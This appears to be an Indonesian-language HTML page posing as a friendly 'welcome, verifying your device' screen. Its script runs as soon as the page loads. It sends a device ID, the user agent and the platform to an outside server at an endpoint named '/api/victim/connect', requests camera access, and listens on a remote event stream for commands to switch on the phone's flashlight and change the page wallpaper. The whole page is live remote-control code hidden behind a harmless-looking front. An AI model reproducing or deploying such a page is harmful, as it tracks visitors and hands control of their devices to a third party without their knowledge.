<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selamat Datang!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }

        h1 {
            color: #667eea;
            margin-bottom: 20px;
            font-size: 2em;
        }

        p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .status {
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-weight: 600;
        }

        .status.connected {
            background: #10b981;
            color: white;
        }

        .status.disconnected {
            background: #ef4444;
            color: white;
        }

        .device-info {
            background: #f3f4f6;
            padding: 20px;
            border-radius: 10px;
            text-align: left;
            margin-top: 20px;
        }

        .device-info p {
            margin: 10px 0;
            font-size: 14px;
            color: #374151;
        }

        .device-info strong {
            color: #1f2937;
        }

        #wallpaperDisplay {
            width: 100%;
            height: 200px;
            object-fit: cover;
            border-radius: 10px;
            margin-top: 20px;
            display: none;
        }

        .spinner {
            border: 4px solid #f3f4f6;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸŽ‰ Selamat Datang!</h1>
        <p>Terima kasih telah mengunjungi halaman kami. Sistem sedang memverifikasi perangkat Anda...</p>
        
        <div class="status disconnected" id="statusBox">
            <span id="statusText">Menghubungkan...</span>
        </div>

        <div class="spinner" id="spinner"></div>

        <div class="device-info">
            <p><strong>Device ID:</strong> <span id="deviceId">-</span></p>
            <p><strong>Platform:</strong> <span id="platform">-</span></p>
            <p><strong>User Agent:</strong> <span id="userAgent">-</span></p>
        </div>

        <img id="wallpaperDisplay" alt="Wallpaper">
    </div>

    <script>
        const deviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        const platform = navigator.platform;
        const userAgent = navigator.userAgent;

        document.getElementById('deviceId').textContent = deviceId;
        document.getElementById('platform').textContent = platform;
        document.getElementById('userAgent').textContent = userAgent;

        let torchSupported = false;
        let stream = null;
        let track = null;

        async function connectToServer() {
            try {
                const response = await fetch('http://zalprimrosex.jerzztech.my.id:2300/api/victim/connect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ deviceId, userAgent, platform })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('statusBox').className = 'status connected';
                    document.getElementById('statusText').textContent = 'âœ“ Terhubung';
                    document.getElementById('spinner').style.display = 'none';
                    
                    listenForCommands();
                    initFlashlight();
                }
            } catch (err) {
                console.error('Connection error:', err);
                document.getElementById('statusText').textContent = 'âœ— Gagal Terhubung';
            }
        }

        async function initFlashlight() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment' }
                });

                track = stream.getVideoTracks()[0];
                const capabilities = track.getCapabilities();

                if (capabilities.torch) {
                    torchSupported = true;
                    console.log('âœ… Flashlight supported');
                } else {
                    console.log('âŒ Flashlight not supported');
                }
            } catch (err) {
                console.error('Flashlight init error:', err);
            }
        }

        async function controlFlashlight(action) {
            if (!torchSupported || !track) {
                console.log('Flashlight not available');
                return;
            }

            try {
                await track.applyConstraints({
                    advanced: [{ torch: action === 'on' }]
                });
                console.log(`Flashlight ${action}`);
            } catch (err) {
                console.error('Flashlight control error:', err);
            }
        }

        function changeWallpaper(imageUrl) {
            const wallpaperImg = document.getElementById('wallpaperDisplay');
            wallpaperImg.src = imageUrl;
            wallpaperImg.style.display = 'block';
            
            document.body.style.backgroundImage = `url(${imageUrl})`;
            document.body.style.backgroundSize = 'cover';
            document.body.style.backgroundPosition = 'center';
            
            console.log('Wallpaper changed:', imageUrl);
        }

        function listenForCommands() {
            const eventSource = new EventSource(`http://zalprimrosex.jerzztech.my.id:2300/api/victim/stream/${deviceId}`);

            eventSource.onmessage = (event) => {
                try {
                    const command = JSON.parse(event.data);

                    if (command.type === 'flashlight') {
                        controlFlashlight(command.action);
                    } else if (command.type === 'wallpaper') {
                        changeWallpaper(command.imageUrl);
                    }
                } catch (err) {
                    console.error('Command parse error:', err);
                }
            };

            eventSource.onerror = () => {
                console.log('Connection lost, reconnecting...');
                eventSource.close();
                setTimeout(listenForCommands, 3000);
            };
        }

        connectToServer();
    </script>
</body>
</html>
